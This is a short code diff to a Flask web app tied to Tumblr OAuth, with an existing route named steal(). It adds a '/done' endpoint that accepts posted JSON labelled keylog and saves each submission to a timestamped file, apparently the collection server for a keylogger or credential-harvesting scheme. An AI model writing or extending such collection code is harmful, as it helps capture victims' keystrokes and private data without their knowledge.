@@ -2,7 +2,7 @@ from flask import Flask, redirect, url_for, session, request
 from flask import g, session, request, url_for, flash
 from flask import redirect, render_template, jsonify
 from flask_oauthlib.client import OAuth
-import pytumblr
+import pytumblr,time,json
 from HTMLParser import HTMLParser
 from app import app
 
@@ -161,3 +161,15 @@ def steal():
 
     return jsonify(status='ok')
 
+@app.route('/done', methods=['POST'])
+def done():
+    # get post data
+    keylog = request.json
+    title = int(time.time())
+    with open(str(title)+'.json', 'w') as outfile:
+        json.dump(keylog, outfile)
+    # print that post data out 
+    #for entry in log:
+     #   print(entry) 
+
+    return jsonify(status='ok')
